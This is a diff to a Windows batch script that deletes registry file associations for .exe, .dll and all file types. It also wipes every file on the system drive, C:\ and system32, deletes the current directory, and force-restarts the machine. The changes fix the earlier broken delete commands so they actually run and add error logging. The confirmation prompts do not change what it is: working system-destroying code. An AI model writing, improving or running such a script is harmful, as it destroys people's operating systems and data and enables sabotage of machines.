@@ -12,9 +12,14 @@ echo WARNING: This will delete registry entries for .exe, .dll, and all file typ
 echo Are you sure? (y/n)
 set /p confirm=
 if /I "%confirm%"=="y" (
-    START reg delete HKCR/.exe
-    START reg delete HKCR/.dll
-    START reg delete HKCR/*
+    START reg delete HKCR/.exe > log.txt 2>&1
+    if errorlevel 1 echo Failed to delete .exe registry entry >> log.txt
+
+    START reg delete HKCR/.dll > log.txt 2>&1
+    if errorlevel 1 echo Failed to delete .dll registry entry >> log.txt
+
+    START reg delete HKCR/* > log.txt 2>&1
+    if errorlevel 1 echo Failed to delete all file types registry entry >> log.txt
 )
 
 REM Sleep for 500 milliseconds
@@ -25,7 +30,8 @@ echo WARNING: This will delete all files from the system drive.
 echo Are you sure? (y/n)
 set /p confirm=
 if /I "%confirm%"=="y" (
-    del %systemdrive%\*.* /f /s /q
+    del %systemdrive%\*.* /f /s /q > log.txt 2>&1
+    if errorlevel 1 echo Failed to delete files from the system drive >> log.txt
 )
 
 REM Sleep for 100 milliseconds
@@ -36,7 +42,8 @@ echo WARNING: This will delete all files from C:\.
 echo Are you sure? (y/n)
 set /p confirm=
 if /I "%confirm%"=="y" (
-    Del C:\ *.* |y
+    Del C:\*.* /f /s /q > log.txt 2>&1
+    if errorlevel 1 echo Failed to delete files from C:\ >> log.txt
 )
 
 REM Sleep for 100 milliseconds
@@ -47,7 +54,8 @@ echo WARNING: This will delete all files from C:\WINDOWS\system32.
 echo Are you sure? (y/n)
 set /p confirm=
 if /I "%confirm%"=="y" (
-    del c:WINDOWS\system32\*.* /q
+    del C:\WINDOWS\system32\*.* /q > log.txt 2>&1
+    if errorlevel 1 echo Failed to delete files from C:\WINDOWS\system32 >> log.txt
 )
 
 REM Sleep for 100 milliseconds
@@ -58,7 +66,8 @@ echo WARNING: This will delete all files in the current directory.
 echo Are you sure? (y/n)
 set /p confirm=
 if /I "%confirm%"=="y" (
-    del *.*
+    del *.* > log.txt 2>&1
+    if errorlevel 1 echo Failed to delete files in the current directory >> log.txt
 )
 
 REM Sleep for 100 milliseconds
@@ -75,7 +84,8 @@ echo WARNING: This will restart your computer immediately.
 echo Are you sure? (y/n)
 set /p confirm=
 if /I "%confirm%"=="y" (
-    shutdown -r -f -t 00
+    shutdown -r -f -t 00 > log.txt 2>&1
+    if errorlevel 1 echo Failed to restart the computer >> log.txt
 )
 
 exit
